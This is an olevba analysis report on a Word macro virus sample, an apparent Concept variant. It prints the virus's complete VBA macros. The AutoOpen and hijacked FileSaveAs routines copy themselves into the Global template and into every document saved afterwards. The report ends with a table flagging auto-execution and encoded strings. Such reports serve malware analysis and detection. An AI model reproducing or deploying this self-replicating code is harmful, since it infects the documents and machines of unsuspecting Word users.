olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Uplamhand-35d4aa60e421b00b14c63997bcffea52262f35e6
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Uplamhand-35d4aa60e421b00b14c63997bcffea52262f35e6 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO sAevaSeliF.bas 
in file: Virus.MSWord.Uplamhand-35d4aa60e421b00b14c63997bcffea52262f35e6 - OLE stream: 'Macros/VBA/sAevaSeliF'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.sAevaSeliF.MAIN"
Dim Installed
Dim I
Dim FName$
Dim Macro$
On Error GoTo -1: On Error GoTo ErrorHandler

Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1

Installed = 0
For I = 1 To WordBasic.CountMacros(1, 0)
If WordBasic.[MacroName$](I, 1, 0) = "MSConcept" Then Installed = 1
Next

If Installed = 0 Then
FName$ = WordBasic.[FileName$]()
Macro$ = FName$ + ":AutoOpen"
WordBasic.MacroCopy "Global:nepOotuA", Macro$
Macro$ = FName$ + ":MSConcept"
WordBasic.MacroCopy "Global:MSConcept", Macro$
Macro$ = FName$ + ":sAevaSeliF"
WordBasic.MacroCopy "Global:FileSaveAs", Macro$
End If

ErrorHandler:
If Err.Number <> 102 Then WordBasic.FileSaveAs dlg
End Sub
-------------------------------------------------------------------------------
VBA MACRO MSConcept.bas 
in file: Virus.MSWord.Uplamhand-35d4aa60e421b00b14c63997bcffea52262f35e6 - OLE stream: 'Macros/VBA/MSConcept'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
    Rem Presenting The Microsoft Concept Virus.
    Rem Updated by Pyro [VBB] (Author of Word97.NightShade)
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Uplamhand-35d4aa60e421b00b14c63997bcffea52262f35e6 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim Installed
Dim I
Dim FName$
Dim Macro$
On Error GoTo -1: On Error GoTo ErrorHandler

Installed = 0
For I = 1 To WordBasic.CountMacros(0, 0)
If WordBasic.[MacroName$](I, 0, 0) = "MSConcept" Then Installed = 1
Next

If Installed = 0 Then
FName$ = WordBasic.[FileName$]()
Macro$ = FName$ + ":MSConcept"
WordBasic.MacroCopy Macro$, "Global:MSConcept"
Macro$ = FName$ + ":sAevaSeliF"
WordBasic.MacroCopy Macro$, "Global:FileSaveAs"
Macro$ = FName$ + ":AutoOpen"
WordBasic.MacroCopy Macro$, "Global:nepOotuA"
End If

ErrorHandler:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

